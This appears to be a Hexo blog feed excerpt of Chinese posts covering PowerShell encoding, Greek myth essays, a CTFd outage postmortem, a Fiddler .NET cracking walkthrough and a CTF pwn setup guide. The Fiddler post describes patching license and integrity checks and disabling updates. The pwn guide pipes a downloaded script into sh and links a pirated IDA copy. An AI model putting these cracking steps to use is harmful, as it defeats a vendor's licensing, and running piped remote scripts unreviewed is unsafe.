href="https://social.technet.microsoft.com/Forums/en-US/cadee4de-24d0-403e-9f3e-75868abf8f34/when-ubr-update-build-revision-registry-key-is-introduced-and-how-it-is-pushed-to-2008-r2-amp?forum=winservercore">https://social.technet.microsoft.com/Forums/en-US/cadee4de-24d0-403e-9f3e-75868abf8f34/when-ubr-update-build-revision-registry-key-is-introduced-and-how-it-is-pushed-to-2008-r2-amp?forum=winservercore</a></p></li><li><p><a href="https://stackoverflow.com/questions/65315845/how-can-i-get-a-windows-10-build-version-revision-number-in-winapi">Howcan I get a Windows 10 build version, revision number inWINAPI?</a>](https://stackoverflow.com/questions/65315845/how-can-i-get-a-windows-10-build-version-revision-number-in-winapi)</p></li></ul><h3 id="setdll.exe-原理---iat">setdll.exe 原理 - IAT</h3><ul><li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking">ImportAdress Table (IAT) Hooking</a></li></ul><h3 id="使-withdll.exe-后台运行">使 withdll.exe 后台运行</h3><ul><li><a href="https://juejin.cn/post/6989148694314483726">写一个函数专门来隐藏窗口</a></li><li><a href="https://learn.microsoft.com/en-us/windows/console/freeconsole">FreeConsole</a></li><li><a href="https://stackoverflow.com/questions/66185000/how-can-i-do-the-freeconsole-but-faster-on-c">[Howcan I do the FreeConsole() but faster onc++](https://stackoverflow.com/questions/66185000/how-can-i-do-the-freeconsole-but-faster-on-c)</a></li><li><a href="https://github.com/xmake-io/xmake/issues/10">连接器指令</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Windows </tag>
            
            <tag> Chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用TryCatchFinally避免OhMyPosh的编码污染</title>
      <link href="/2022/12/01/shi-yong-trycatchfinally-bi-mian-ohmyposh-de-bian-ma-wu-ran/"/>
      <url>/2022/12/01/shi-yong-trycatchfinally-bi-mian-ohmyposh-de-bian-ma-wu-ran/</url>
      
        <content type="html"><![CDATA[<h1 id="使用-try-catch-finally-避免-ohmyposh-的编码污染">使用Try-Catch-Finally 避免 OhMyPosh 的编码污染</h1><h2 id="问题">问题</h2><p>OhMyPosh 为了能够在 Powershell 中渲染其美化过的特定字符，会将Powershell 的代码页（Codepage）重置为 65001 (UTF-8).导致命令行工具的交互变为英文。而且不可以用 <code>chcp 936</code>来解决，因为 OhMyPosh在每一次命令执行后都会刷新输出界面，导致编码再次被覆盖。</p><p>为了验证是每次命令后刷新，可以用 <code>chcp 936; ping</code>来测试，输出为中文。</p><h2 id="solution">Solution</h2><p>这里可以使用 Try-Finally 来在 <code>oh-my-posh</code>退出时自动还原编码。</p><h2 id="poc">PoC</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$previousOutputEncoding</span> = <span class="token namespace">[Console]</span>::OutputEncoding<span class="token namespace">[Console]</span>::OutputEncoding = <span class="token namespace">[Text.Encoding]</span>::UTF8<span class="token keyword">try</span> <span class="token punctuation">{</span>    oh-my-posh init pwsh <span class="token operator">--</span>config ~<span class="token operator">/</span>custom<span class="token punctuation">.</span>omp<span class="token punctuation">.</span>json <span class="token punctuation">|</span> <span class="token function">Invoke-Expression</span><span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>    <span class="token namespace">[Console]</span>::OutputEncoding = <span class="token variable">$previousOutputEncoding</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>English Present. Prometheus</title>
      <link href="/2022/11/29/english-present-prometheus/"/>
      <url>/2022/11/29/english-present-prometheus/</url>
      
        <content type="html"><![CDATA[<h2 id="prometheus">Prometheus</h2><p>In Greek mythology, Prometheus is a Titan god of fire. Prometheus isbest known for defying the gods by stealing fire from them and giving itto humanity in the form of technology, knowledge, and more generally,civilization.</p><p>In some versions of the myth, he is also credited with the creationof humanity from clay. Prometheus is known for his intelligence and forbeing a champion of humankind, and is also generally seen as the authorof the human arts and sciences. He is sometimes presented as the fatherof Deucalion, the hero of the flood story.</p><p>In the trick at Mecone, a sacrificial meal marking the "settling ofaccounts" between mortals and immortals, Prometheus played a trickagainst Zeus. He placed two sacrificial offerings before the Olympian: aselection of beef hidden inside an ox's stomach, and the bull's boneswrapped completely in "glistening fat". Zeus chose the latter, setting aprecedent for future sacrifices. Henceforth, humans would keep that meatfor themselves and burn the bones wrapped in fat as an offering to thegods. This angered Zeus, who hid fire from humans in retribution. Inthis version of the myth, the use of fire was already known to humans,but withdrawn by Zeus.</p><p>Prometheus stole fire back from Zeus in a fennel stalk and restoredit to humanity (565–566). This further enraged Zeus, who sent the firstwoman to live with humanity (Pandora, not explicitly mentioned). Thewoman, a "shy maiden", was fashioned by Hephaestus out of clay andAthena helped to adorn her properly (571–574). Hesiod writes, "From heris the race of women and female kind: of her is the deadly race andtribe of women who live amongst mortal men to their great trouble, nohelpmeets in hateful poverty, but only in wealth" (590–594). For hiscrimes, Prometheus was punished by Zeus, who bound him with chains andsent an eagle to eat Prometheus' immortal liver every day, which thengrew back every night. Years later, the Greek hero Heracles, with Zeus'permission, killed the eagle and freed Prometheus from this torment(521–529).</p><p>The punishment of Prometheus as a consequence of the theft of fireand giving it to humans is a popular subject of both ancient and modernculture. Zeus, king of the Olympian gods, sentenced Prometheus toeternal torment for his transgression. Prometheus was bound to a rock,and an eagle—the emblem of Zeus—was sent to eat his liver (in ancientGreece, the liver was thought to be the seat of human emotions). Hisliver would then grow back overnight, only to be eaten again the nextday in an ongoing, infinite cycle. According to several major versionsof the myth, most notably that of Hesiod, Prometheus was eventuallyfreed by the hero Heracles. In yet more symbolism, the struggle ofPrometheus is located by some at Mount Elbrus or at Mount Kazbek, twovolcanic promontories in the Caucasus Mountains beyond which for theancient Greeks lay the realm of the barbarii.</p><p>In another myth, Prometheus establishes the form of animal sacrificepracticed in ancient Greek religion. Evidence of a cult to Prometheushimself is not widespread. He was a focus of religious activity mainlyat Athens, where he was linked to Athena and Hephaestus, who were theGreek deities of creative skills and technology.</p><p>In the Western classical tradition, Prometheus became a figure whorepresented human striving (particularly the quest for scientificknowledge) and the risk of overreaching or unintended consequences. Inparticular, he was regarded in the Romantic era as embodying the lonegenius whose efforts to improve human existence could also result intragedy.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 英语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd 删站事故复盘</title>
      <link href="/2022/11/25/ctfd-shan-zhan-shi-gu-fu-pan/"/>
      <url>/2022/11/25/ctfd-shan-zhan-shi-gu-fu-pan/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfd-删站事故复盘">CTFd 删站事故复盘</h1><p>本删站事故发生于 2022 年 11 月 25 日。</p><h2 id="事故缘由">事故缘由</h2><p>2022 年 6 月起，我负责打理学校实验室的 CTFd 站点。</p><p>站点使用了 Docker Compose 来部署应用，再使用 Nginx 负责反代。</p><p>2022 年 11 月 25 日，由于服务器使用的是 CentOS 8 的操作系统，已经 EoL了。我想解决服务器上一团糟的依赖地狱还有源镜像的问题。</p><h2 id="事故过程">事故过程</h2><p>由于现存的 docker 是由宝塔安装的，并不是跟随 docker-ce的最新版本，于是我选择使用<code>yum --allowerasing upgrade</code>加入官方源进行覆盖安装。这时 yum使用了旧的宝塔版本覆盖了我后来引入的官方源。再次覆盖安装回去即可。</p><p>截止目前都没有问题，只是导致服务发生了分钟级别无关紧要的离线罢了。</p><p>这时，由于宝塔面板 docker的一些前端bug。我重启了下防火墙，并再次重装了 docker.</p><p>紧接着，站点发生了 502 Bad Gateway.</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/CTFd删站事故复盘/image-20221125202927743.png"></p><p>思考了下，这是由于 Nginx 无法与容器通信导致的网络问题。果断使用<code>docker logs &lt;CTFd 容器 ID&gt; | tail</code>查看了下最近的几条日志。发现是无法连接 MariaDB数据库，关闭防火墙后解决。</p><p>这时，使用 <code>docker compose up -d</code> 启动服务时会提示<code>strconv.Atoi: parsing "": invalid syntax</code> 错误，上StackOverflow 搜索后发现了一篇帖子。</p><blockquote><p>https://stackoverflow.com/questions/73948802/strconv-atoi-parsing-invalid-syntax</p></blockquote><p><img src="https://googles.plus/images/loading.gif" data-original="/images/CTFd删站事故复盘/image-20221125203405673.png"></p><p>敲完了 <code>docker compose down --remove-orphans</code>命令后马上觉得不对，往下翻发现了……</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/CTFd删站事故复盘/image-20221125203442763.png"></p><p>这里已经意识到发生惨剧了，立马关闭了所有容器。尽量减少操作以防 Docker有什么 GC 机制。</p><h3 id="发生了什么">发生了什么</h3><blockquote><p>https://docs.docker.com/engine/reference/commandline/compose_down/</p></blockquote><table><colgroup><col style="width: 23%"><col style="width: 76%"></colgroup><thead><tr class="header"><th>Name, shorthand</th><th>Description</th></tr></thead><tbody><tr class="odd"><td><code>--remove-orphans</code></td><td>Remove containers for services not defined in the Compose file.</td></tr></tbody></table><p><code>--remove-orphans</code> 会删除 compose 文件中未定义的容器。</p><p>使用 <code>docker ps</code> 看了下，只剩一个 CodiMD 的容器了……</p><h3 id="该做什么呢">该做什么呢</h3><p>万幸的是，CTFd 在建设的时候就使用了 Volume将目录映射到宿主机目录，所以不出意外的话 MariaDB, Redis 和 CTFd的数据是都在的。只是重新部署服务的事情了。</p><p>先将仅存的备份做一份镜像，然后再次<code>docker compose up -d</code></p><p>（<code>-d</code> 为后台启动。同时可以酌情使用<code>--no-recreate</code> 以不重新创建已经停止的容器）</p><h4 id="网络问题">网络问题</h4><p>CTFd 默认会配置端口转发，可能会启动失败，建议先清空 iptables chains再重启 docker 服务。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> filter <span class="token parameter variable">-F</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> filter <span class="token parameter variable">-X</span><span class="token function">sudo</span> systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后服务恢复正常了。</p><h2 id="类似的故事">类似的故事</h2><p><a href="https://billchen.bid/jekyll/update/2021/09/06/dn110-rescue/">电脑110官网删站事故复盘- Billchenchina</a></p><h2 id="before-the-accident">Before the Accident</h2><h3 id="容器备份">容器备份</h3><p>可以使用 <code>docker commit</code> 创建容器的快照</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> commit <span class="token parameter variable">-p</span> <span class="token operator">&lt;</span>容器 ID<span class="token operator">&gt;</span> container-backup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令会生成一个作为Docker镜像的容器快照，可以通过<code>docker images</code>查看创建的Docker镜像。为了备份该快照，我们有两个选择，一个是我们可以登录进Docker 注册中心，并推送该镜像；另一个是我们可以将 Docker镜像打包成tar包备份，以供今后使用。</p><p>国内访问速度慢的可怜，所以建议选择本地备份，这也是绝大多数人的选择。要完成该操作，我们需要运行以下<code>docker save</code> 命令。</p><pre class="line-numbers language-none"><code class="language-none">docker save -o /Volumes/work/docker/backup/nginx-backup.tar nginx-backup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="容器恢复">容器恢复</h3><p>在注册中心推送了这些 Docker 镜像，那么我们仅仅需要把那个 Docker镜像拉回本地。</p><pre class="line-numbers language-none"><code class="language-none">docker pull arunpyasi/container-backup:test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将这些 Docker 镜像作为 tar 包文件备份到了本地，那么我们只要使用<code>docker load</code> tar 包的备份路径以加载该镜像。</p><pre class="line-numbers language-none"><code class="language-none">docker load -i ~/container-backup.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在，为了确保这些Docker镜像已经加载成功，我们来运行 docker images命令。</p><pre class="line-numbers language-none"><code class="language-none">docker images# 镜像被加载后，用加载的镜像去运行容器。docker run -d -p 80:80 nginx-backup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>希腊神话-Achilles</title>
      <link href="/2022/11/23/xi-la-shen-hua-achilles/"/>
      <url>/2022/11/23/xi-la-shen-hua-achilles/</url>
      
        <content type="html"><![CDATA[<h1 id="希腊神话-achilles">希腊神话-Achilles</h1><h2 id="题目">题目</h2><p><strong>Directions:</strong> The story of the Iliad is, in fact, thestory of Achilles. Please make some comments on the hero Achilles byciting some specific details of his stories. You should use your ownideas and knowledge and specific details of the mythological stories todevelop your essay. For this part, you should write at least 400words.</p><h2 id="正文">正文</h2><h3 id="achilles-in-my-view">Achilles in My View</h3><p>Among the Greeks who fought against Troy, Achilles is the bravest farbeyond the others. His mother was the goddess Thetis, a Nereid. Hisfather was Peleus, king of Thessaly and a grandson of Zeus, the lord ofheaven. It was at the wedding feast of Thetis and Peleus that thegoddess Eris hurled among the guests a golden apple that was to causethe Trojan War.</p><p>Soon after the birth of Achilles, Thetis tried to outwit the fates,who had foretold that war would cut down her son in his prime. So thatno weapon might ever wound him, she dipped her baby in the black watersof the Styx, the river that flowed around the underworld. Only the heelby which she held him was untouched by the magic water, and this was theonly part of his body that could be wounded. This is the source of theexpression Achilles’ heel, meaning a vulnerable point.</p><p>Not to mention his teenage years. When the Trojan War began,Achilles’ mother, fearing that the decree of the fates would prove true,dressed him as a girl and hid him among the maidens at the court of theking of Scyros. The trick did not succeed. Odysseus, the shrewdest ofthe Greeks, went to the court disguised as a peddler. When he had spreadhis wares before the girls, a sudden trumpet blast was played. The girlsscreamed and fled, but Achilles betrayed the male identity by taking outa sword and spear from the peddler’s stock.</p><p>In addition to the above, Achilles joined the battle and took commandof his father’s men, myrmidons. They set an example of bravery for theother Greeks. Then he quarreled with Agamemnon, the leader of theGreeks, over a captive whom he loved. When she was taken from him, hewithdrew his soldiers from the fight and sulked in his tent. As a resultthe Greek armies were driven back to their ships by the enemy.</p><p>At last, moved by the plight of the Greeks, Achilles entrusted hismen and his armor to Patroclus, his best friend. Thus, when Patroclusled the myrmidons into battle, the enemy mistook him for Achilles andfled in panic. Patroclus, however, was killed by Hector, the leader ofthe enemy. Achilles’ armor became the prize of Hector. Angered andstricken by grief, Achilles vowed to kill Hector. Finally, his motherhastened to Olympus. She wanted to beg a new suit of armor fromHephaestus. Achilles again went into battle. Achilles then killedHector.</p><p>Although enemy had now lost their leaders, they were able to continuefighting with the help of other nations. Achilles was now weary of warand, moreover, had fallen in love with Polyxena, sister of Hector. Towin her in marriage he consented to ask the Greeks to make peace. He wasin the temple arranging for the marriage when Hector’s brother, Paris,shot him with a poisoned arrow in the only vulnerable part of hisbody—the heel.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>高校永无止境的九月</title>
      <link href="/2022/11/21/yong-wu-zhi-jing-de-jiu-yue/"/>
      <url>/2022/11/21/yong-wu-zhi-jing-de-jiu-yue/</url>
      
        <content type="html"><![CDATA[<h1 id="高校永无止境的九月">高校永无止境的九月</h1><h2 id="永恒九月">永恒九月</h2><p><strong>永恒九月</strong>也叫<strong>永无止境的九月</strong>，是一个<a href="https://zh.wikipedia.org/wiki/Usenet">Usenet</a>俚语，指一段自1993年9月开始的时期，由戴夫·费舍尔（DavidFischer）创造。这一表述代表了一种观点，认为自那时起新用户（菜鸟）们的涌入<strong>持续地降低了</strong>Usenet 乃至更多互联网上的行为、言论的水准。</p><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E6%B0%B8%E6%81%92%E4%B9%9D%E6%9C%88">永恒九月</a></p></blockquote><h2 id="在高校">在高校</h2><p>在我所就读的学校的CS专业，有着几个讨论CS相关技术的QQ群。非常扫兴的是，一聊CS就会冷群，反倒是发的打杂活赚闲钱的东西人人参与。一到“大创”时就会刮起一阵又一阵的浮躁之风。虎头蛇尾的调错大哥，此起彼伏。</p><h2 id="内卷">内卷</h2><blockquote><p>引自 <strong>zu1k</strong></p></blockquote><p>内卷的产生不是偶然，内卷的环境+不合理的评判标准+竞争的人导致了内卷的必然发生，至少我是这样认为的。</p><p>所谓内卷的环境，那必然要是金字塔形状，底层占绝大多数，只有少数人可以上升，这样就会形成竞争的原因。甚至要严格限制上升的人数，这样才能使竞争更加激烈，才会孵化出各种竞争手段。</p><p>有了引起竞争的条件，形成的是竞争的行为，如果评判标准合理，最终的结果是通过健康的竞争选拔出真正有实力的人，这应该是一个正向的积极的过程。可惜，绝大多数情况这个评判标准并不合理，更有为了利益为了压榨故意采用恶心人的标准的，比如企业里面单纯通过工作时长来评判、比如老师单纯通过字数来评判等等。</p><p>这就是恶心人的地方，拥有决定权的人通过设立不合理的评判标准，故意引起底层内卷，从而满足自己的利益。而作为内卷的主要参与者———竞争的人，却是这三个条件中最可怜的那一部分，不仅需要付出大量努力、时间等参与到内卷中，还有很大几率无法在内卷中脱颖而出，从而白白浪费了自己的时间精力等；他们还需要承受内卷同仁的满满的恶意，竞争者之间往往就是这样，在内卷局中的人难以看清形势，难以把矛头对准真正掌握规则、真正引起内卷的上层管理者和标准制定者，他们只会在底层互相伤害。真是可悲啊。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fiddler .Net逆向</title>
      <link href="/2022/11/19/fiddler-net-ni-xiang/"/>
      <url>/2022/11/19/fiddler-net-ni-xiang/</url>
      
        <content type="html"><![CDATA[<h1 id="fiddler-.net逆向">Fiddler .Net逆向</h1><h2 id="软件简介">软件简介</h2><p>是近来比较流行的 Electron框架界面，比较方便开发，然后界面比较优美，代价是用户直接能看到源码。</p><h2 id="破解过程">破解过程</h2><h3 id="激活">激活</h3><p>审一下写在前端的代码，搜一下<strong>License</strong>，果然发现了有关函数。</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/fiddler_0.png"></p><p>直接在函数入口点对激活信息进行覆盖，这一步过后其实已经成功破解了。但是软件在启动时会对每个模块load的数据进行校验，所以继续深入。</p><h3 id="校验绕过">校验绕过</h3><blockquote><p>.Net 是一种建立在虚拟机上执行的语言，它直接生成 MSIL 的中间语言，再由.Net 编译器 JIT 解释映象为本机代码并交付 CPU 执行。它和 Java是同一种机制的语言。这种语言的优点是：开发者不需要去考虑程序在哪里运行，只需要把功能做出来，虚拟机会在任何地方实现功能。这是一个很好的想法，但虚拟机的中间语言由于带了大量的“元数据”(meta-data)信息，所以也极容易被反编译。</p></blockquote><blockquote><p>可以理解为可乐把配方分发到每个厂子，虽然每个厂子都可以配货，却让配方的保密性大大降低</p></blockquote><p>最终在 <code>Fiddler.WebUi.dll</code> 中的 <code>ScriptHelper</code>类的 <code>TryOpenClientMainScript</code> 方法中发现了校验过程。</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/fiddler_1.png"></p><p>如图，如果在 <strong>Line 35</strong>校验失败的话，加载进程将终止。</p><h3 id="license-验证">License 验证</h3><p><code>FiddlerBackendSDK.dll</code> 的 <code>UserClient</code> 类的<code>public AccountDTO GetBestAccount(UserWithBestAccountDTO user)</code>方法中给出了一个非常简单的账号验证。</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">public</span> <span class="token return-type class-name">AccountDTO</span> <span class="token function">GetBestAccount</span><span class="token punctuation">(</span><span class="token class-name">UserWithBestAccountDTO</span> user<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span>BestEverywhereAccountId <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> user<span class="token punctuation">.</span>Accounts<span class="token punctuation">.</span><span class="token function">FirstOrDefault</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">UserAccountDTO</span> x<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> x<span class="token punctuation">.</span>Id <span class="token operator">==</span> user<span class="token punctuation">.</span>BestEverywhereAccountId<span class="token punctuation">.</span>Value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将 <code>x.Id == user.BestEverywhereAccountId.Value</code> 改为<code>true</code> 即可 bypass</p><h3 id="删除更新机制">删除更新机制</h3><p>在 main.js 中替换版本号或者直接防止进入函数即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> .Net </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Pwn 环境搭建</title>
      <link href="/2022/11/17/ctf-pwn-huan-jing-da-jian/"/>
      <url>/2022/11/17/ctf-pwn-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="ctf-pwn-环境搭建">CTF Pwn 环境搭建</h1><h2 id="操作系统选择">操作系统选择</h2><p><strong>物理环境：VMware ESXi VM 虚拟环境：Ubuntu 18.04</strong></p><p><strong>需要注意，Linux的版本太高很多插件容易出问题，所以不建议使用最新版本的Linux系统，最稳定的不是太老旧的就可以。此外，环境因人而异，没有模板，不是固定的，按需分配。</strong></p><h2 id="必备一般软件">必备一般软件</h2><ol type="1"><li>vim：个人必备，强烈建议学习一点vim的相关知识，可以提高效率，避免安装过多的编辑器或者IDE</li><li>git：必备，很多高效的插件都是放在GitHub上的</li><li>python：必备，建议python3，毕竟python2已经不支持了</li><li>pip：必备，有一些插件需要使用pip进行安装</li><li>一款编辑器：这个看个人需求，vscode、sublimetext等，个人喜欢就好。如果有条件的话，可以设置一下配置，当作一个简单的开发IDE使用，毕竟Pwn环境中开发的代码不会很多。</li></ol><p>以上各软件根据官方文档自行安装即可。</p><h2 id="pwn常用软件">Pwn常用软件</h2><p>*<strong>涉及到的各种软件的安装，均以Ubuntu平台为例*</strong></p><ol type="1"><li><p><strong>pwntools</strong></p><p>一个ctf框架和漏洞利用开发库，用python开发,必备神器，作用不多解释。安装方法：</p></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">apt-get</span> <span class="token function">install</span> python python-pip python-dev libssl-dev libffi-dev build-essential$ pip <span class="token function">install</span> <span class="token parameter variable">-U</span> setuptools$ pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip$ pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>个人使用的是python2版本，需要注意一下。pwntools现在支持python3了，这里给出GitHub地址，有需要的可以参考其readme进行安装python3的pwntools。<a href="https://github.com/arthaud/python3-pwntools">支持python3的pwntools</a></p><p>安装完成后，打开python测试,执行<code>from pwn import *</code>不会报错即可。（备注：在mac平台下不要使用pip安装，你会怀疑人生的，使用homebrew安装）</p><ol start="2" type="1"><li><p><strong>gdb</strong></p><p>动态调试软件，必备。 安装方法： ``` apt-get install gdb</p></li><li><p><strong>peda/pwngdb/gef</strong></p><p>这是常见的gdb的三个插件，配合gdb使用可以提升调试效率。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装pwndbg：</span><span class="token function">git</span> clone https://github.com/pwndbg/pwndbg<span class="token builtin class-name">cd</span> pwndbg./setup.sh<span class="token comment"># 安装peda：</span><span class="token function">git</span> clone https://github.com/longld/peda.git~/peda<span class="token builtin class-name">echo</span> <span class="token string">"source ~/peda/peda.py"</span> <span class="token operator">&gt;&gt;</span> ~/.gdbinit<span class="token comment"># 安装gef：</span><span class="token function">wget</span> <span class="token parameter variable">-q</span> -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh<span class="token operator">|</span> <span class="token function">sh</span><span class="token function">wget</span> <span class="token parameter variable">-q</span> <span class="token parameter variable">-O</span> ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py<span class="token builtin class-name">echo</span> <span class="token builtin class-name">source</span> ~/.gdbinit-gef.py <span class="token operator">&gt;&gt;</span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p></li></ol><p>因为在同一时刻只能使用一种插件，而且在解决不同类型的题目时使用不同的插件，因此需要配置三种插件的快捷切换。</p><p>在 <code>.gdbinit</code> 中配置： </p><pre class="line-numbers language-none"><code class="language-none">define init-pedasource ~/peda/peda.pyenddocument init-pedaInitializes the PEDA (Python Exploit Development Assistant for GDB) frameworkenddefine init-pwndbgsource ~/.gdbinit_pwndbgenddocument init-pwndbgInitializes PwnDBGenddefine init-gefsource ~/.gdbinit-gef.pyenddocument init-gefInitializes GEF (GDB Enhanced Features)end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><p>在 <code>/usr/bin</code> 创建每一个插件的相应入口</p><p>/usr/bin/gdb-peda</p><pre class="line-numbers language-none"><code class="language-none">#!/bin/shexec gdb -q -ex init-peda "$@"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>/usr/bin/gdb-pwndbg</p><pre class="line-numbers language-none"><code class="language-none">#!/bin/shexec gdb -q -ex init-pwndbg "$@"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>/usr/bin/gdb-gef</p><pre class="line-numbers language-none"><code class="language-none">#!/bin/shexec gdb -q -ex init-gef "$@"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>给予权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x /usr/bin/gdb-*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4" type="1"><li><p><strong>32位程序支持</strong></p><p>必备，装它。</p></li></ol><pre class="line-numbers language-none"><code class="language-none">apt-get install libc6-dev-i386<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5" type="1"><li><strong>qemu</strong></li></ol><p>这是arm的pwn环境，前期可以不安装，但是终究是逃不过的，建议一步到位。</p><p>安装qemu：</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install qemusudo apt-get install qemu-system qemu-user-static binfmt-support<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装依赖库：</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install -y gcc-arm-linux-gnueabisudo apt-get install qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="6" type="1"><li><p><strong>LibcSearcher</strong></p><p>泄露libc库中函数的偏移的库，建议安装，可以节省时间，提高效率。安装LibcSearcher：</p></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip <span class="token function">install</span> capstone<span class="token function">git</span> clone https://github.com/lieanu/LibcSearcher.git<span class="token builtin class-name">cd</span> LibcSearcherpython setup.py develop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="7" type="1"><li><strong>ROPgadget和one_gadget</strong></li></ol><p>ROPgadget是用来找gadget的，one_gadget用来寻找libc库中的execve('/bin/sh',NULL, NULL)可以一个gadget就可以getshell，建议安装。</p><p>安装ROPgadget：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 先安装Capstone,它是一个轻量级的多平台架构支持的反汇编架构。</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-capstone <span class="token comment"># 下载好ROPgadget解压，并进入文件夹中</span>python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装one_gadget：</p><p><code>sudo apt install ruby``gem install one_gadget</code></p><ol start="8" type="1"><li><strong>IDA</strong></li></ol><p>静态调试必备，不多解释。这里建议安装52上的版本： <a href="https://www.52pojie.cn/thread-675251-1-1.html">52上的IDA</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Show 类型-7 WP</title>
      <link href="/2022/11/15/ctf-show-lei-xing-7-wp/"/>
      <url>/2022/11/15/ctf-show-lei-xing-7-wp/</url>
      
